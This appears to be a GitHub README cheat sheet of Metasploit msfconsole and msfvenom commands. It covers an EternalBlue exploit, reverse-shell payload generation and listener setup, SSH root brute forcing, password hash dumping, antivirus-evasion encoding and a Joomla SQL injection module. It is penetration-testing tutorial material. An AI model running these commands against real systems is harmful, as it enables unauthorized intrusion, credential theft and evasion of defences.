# Metasploit-Framework-
Here are some examples of common tasks you can perform with **Metasploit Framework (`msfconsole`)** in Kali Linux:

---

### **1. Scanning for Vulnerabilities**
Use the `auxiliary/scanner` modules to scan for vulnerabilities.

#### Example: Scan for Open Ports
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

---

### **2. Exploiting a Vulnerability**
Use an exploit module to target a specific vulnerability.

#### Example: Exploit MS17-010 (EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **3. Generating a Payload**
Create a reverse shell payload to gain access to a target system.

#### Example: Generate a Windows Meterpreter Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe
```

---

### **4. Creating a Listener**
Set up a listener to catch a reverse shell connection.

#### Example: Start a Multi/Handler
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **5. Exploit Database Integration**
Search for specific vulnerabilities using the Metasploit database.

#### Example: Search for Apache Vulnerabilities
```bash
search apache
```

---

### **6. Bruteforce Attacks**
Attempt to bruteforce login credentials.

#### Example: SSH Login Bruteforce
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

### **7. Post-Exploitation**
Run post-exploitation modules after gaining access.

#### Example: Dump Password Hashes
```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

---

### **8. Bypassing Antivirus**
Generate an encoded payload to bypass simple antivirus detection.

#### Example: Generate an Encoded Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > bypass_av.exe
```

---

### **9. Web Exploits**
Use web-specific modules to target web servers or applications.

#### Example: Exploit Joomla SQL Injection
```bash
use exploit/multi/http/joomla_sql_injection
set RHOST 192.168.1.200
set TARGETURI /joomla
run
```

---

### **10. Database Interaction**
Metasploit supports database integration to track hosts and vulnerabilities.

#### Example: Adding a Target Host
```bash
db_connect msf:password@127.0.0.1/msf
db_nmap -sS 192.168.1.0/24
hosts
```

---

These examples showcase only a fraction of Metasploit's capabilities. You can always explore more modules using:
```bash
search <keyword>
```
For instance:
```bash
search smb
```
